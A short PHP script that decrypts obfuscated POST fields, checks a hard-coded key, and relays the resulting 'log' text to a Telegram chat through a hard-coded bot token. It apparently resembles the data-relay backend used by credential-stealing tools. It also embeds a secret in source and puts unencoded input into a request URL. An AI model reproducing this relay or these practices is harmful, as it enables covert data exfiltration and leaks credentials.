<?php

require ("database.php");
require ("utils.php");
require ("cipher.php");

$logText = decrypt($_POST[encrypt("log")]);
$logKey = decrypt($_POST[encrypt("key")]);

if($logKey != 1337)
{
    echo 'error';
    exit;
}

echo logFun($logText);

function logFun($text)
{
    $token = '54525434263:AAFfAjsgf-AAqsSf9V6OoMe7WPwX6dSf9rM';
    $chat = '-779583555';
    
    $send = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat}&parse_mode=html&text={$text}","r");
    
    if ($send)
    {
        return 'ok';
    }
    else
    {
        return 'error';
    }
}

?>